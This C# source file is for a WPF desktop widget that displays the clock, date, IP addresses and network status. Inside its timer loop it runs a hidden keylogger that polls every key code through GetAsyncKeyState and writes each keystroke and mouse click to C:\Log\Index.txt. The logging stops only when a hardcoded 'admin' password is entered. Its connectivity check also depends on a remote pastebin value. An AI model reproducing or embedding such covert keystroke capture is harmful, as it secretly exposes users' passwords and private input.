using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace ManagerThing
{
    public partial class MainWindow : Window
    {

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        string pathname = @"C:\Log";

        string _password = "admin";


        public MainWindow()
        {
            InitializeComponent();
            writeText(DateTime.Now.ToString("'[Logged in ] 'dd/MM/yyyy' at 'HH:mm:ss"));

            int iterationCount = 0;
            bool isAdmin = false;

            bool hasInternetConnection = HasInternetConnection();
            bool hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
            this.ipText.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();

            DispatcherTimer timer = new DispatcherTimer(new TimeSpan(0, 0, 0, 0, 72), DispatcherPriority.Normal, delegate {
                iterationCount++;
                if (iterationCount % 32 == 0) {
                    hasInternetConnection = HasInternetConnection();
                    hasNetworkConnection = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
                }
                if (iterationCount % 16 == 0) {
                    if (this.passwordInput.Password == _password.ToLower()) {
                        this.passwordInput.Visibility = System.Windows.Visibility.Collapsed;
                        isAdmin = true;
                    }
                    this.timeText.Text = DateTime.Now.ToString("HH:mm:ss");
                    this.weekText.Text = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(DateTime.Now.ToString("dddd"));
                    this.dateText.Text = DateTime.Now.ToString("dd/MM/yyyy");
                    this.dateText.ToolTip = System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(DateTime.Now.ToString("MMMM"));

                    this.ipText_local.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();

                    if (!hasInternetConnection) {
                        if (this.hasInternet.Foreground.ToString().ToLower() != "#ffc42e3b") {
                            this.hasInternet.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffc42e3b");
                            writeText("[Connection] Internet was disconnected");
                        }
                        this.ipText.Text = " ";
                        loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                    } else {
                        this.hasInternet.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff90ad2f");
                        if (this.ipText.Text == " " || (iterationCount >= 1 && iterationCount <= 20)) {
                            this.ipText.Text = GetPublicIP().ToString();
                        }
                    }
                    if (hasNetworkConnection) {
                        this.hasNetwork.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff90ad2f");
                    } else {
                        this.hasNetwork.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffc42e3b");
                    }
                }
                
                if (iterationCount >= 4) {
                    if (!isAdmin) {
                        for (int j = 0; j < 60; j++) {
                            for (Int32 i = 0; i < 255; i++) {
                                int keyState = GetAsyncKeyState(i);
                                if (keyState == 1 || keyState == -32767) {
                                    string _k = KeyInterop.KeyFromVirtualKey((int)i).ToString();
                                    _k =  (_k == "None")                         ? "MouseDown"
                                        : (_k == "OemPeriod" || _k == "AbntC2")  ? "."
                                        : (_k == "OemComma"  || _k == "Decimal") ? ","
                                        : (_k == "AbntC1"    || _k == "Divide")  ? "/"
                                        : (_k == "Multiply")                     ? "*"
                                        : (_k == "OemMinus" || _k == "Subtract") ? "-"
                                        : (_k == "OemPlus"  || _k == "Add")      ? "+"
                                        : (_k == "Oem3")                         ? "'"
                                        : (_k == "OemQuestion")                  ? "?"
                                        : _k == "Snapshot" ? "PrtScn"
                                        : _k == "Scroll"   ? "ScrollLock"
                                        : _k == "Pause"    ? "PauseBreak"
                                        : _k == "Back"     ? "Backspace"
                                        : _k == "Next"     ? "PageDown"
                                        : _k;
                                    try {
                                        writeText("[Key       ] " + _k);
                                    } catch {
                                        Console.WriteLine(">>> Too fast! <<<");
                                    }
                                    break;
                                }
                            }
                        }
                    }
                }
            }, this.Dispatcher);
        }

        private void gridOnMouseEnter(object sender, MouseEventArgs e)
        {
            weekText.Foreground = dateText.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");
        }

        private void gridOnMouseLeave(object sender, MouseEventArgs e)
        {
            weekText.Foreground = dateText.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff444a59");
        }



        private void DragWindow(object sender, MouseButtonEventArgs e) {  DragMove();  }

        private void MinimizeWindow(object sender, MouseButtonEventArgs e) {  this.WindowState = WindowState.Minimized;  }
        private void AlphaWindow(object sender, MouseButtonEventArgs e) {
            if (this.content.Opacity == 0.3) {
                this.content.Opacity = 0.5;
            } else if (this.content.Opacity == 0.5) {
                this.content.Opacity = 1;
            } else {
                this.content.Opacity = 0.3;
            }
        }

        private void MinimizeWindowEnter(object sender, MouseEventArgs e) {  minimizeWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");  }
        private void MinimizeWindowLeave(object sender, MouseEventArgs e) {  minimizeWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff1c1f25");  }
        private void AlphaWindowEnter(object sender, MouseEventArgs e) {  alphaWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ffeeeeee");  }
        private void AlphaWindowLeave(object sender, MouseEventArgs e) {  alphaWindowButton.Foreground = (Brush)new BrushConverter().ConvertFromString("#ff1c1f25");  }


        public bool HasInternetConnection()
        {
            try {
                string str = "";
                WebRequest request = WebRequest.Create("http://pastebin.com/raw.php?i=fmDaUMae");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream())) {
                    str = stream.ReadToEnd();
                }
                if (str == "0") {
                    return true;
                } else {
                    Console.WriteLine(str);
                    return false;
                }
            } catch {
                return false;
            }
        }

        public void writeText(string str) {
            using (StreamWriter file = new StreamWriter(pathname + @"\Index.txt", true)) {
                file.WriteLine(str);
            }
            Console.WriteLine(str);
        }

        public string GetPublicIP()
        {
            try {
                string direction = "";
                WebRequest request = WebRequest.Create("http://matheus.avellar.c9.io/ip");
                using (WebResponse response = request.GetResponse())
                using (StreamReader stream = new StreamReader(response.GetResponseStream())) {
                    direction = stream.ReadToEnd();
                }
                loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                writeText("[Connection] Connected as " + direction);
                return direction;
            } catch {
                loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Collapsed;
                writeText("[Connection] Error connecting");
                return "127.0.0.1";
            }
        }

        private void IpRefresh(object sender, MouseButtonEventArgs e)
        {
            this.ipText.Text = "127.0.0.1";
            this.ipText_local.Text = "127.0.0.1";
            loadingText.Visibility = loadingScreen.Visibility = System.Windows.Visibility.Visible;
            this.ipText.Text = GetPublicIP();
            this.ipText_local.Text = (Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork)).ToString();
        }
    }
}
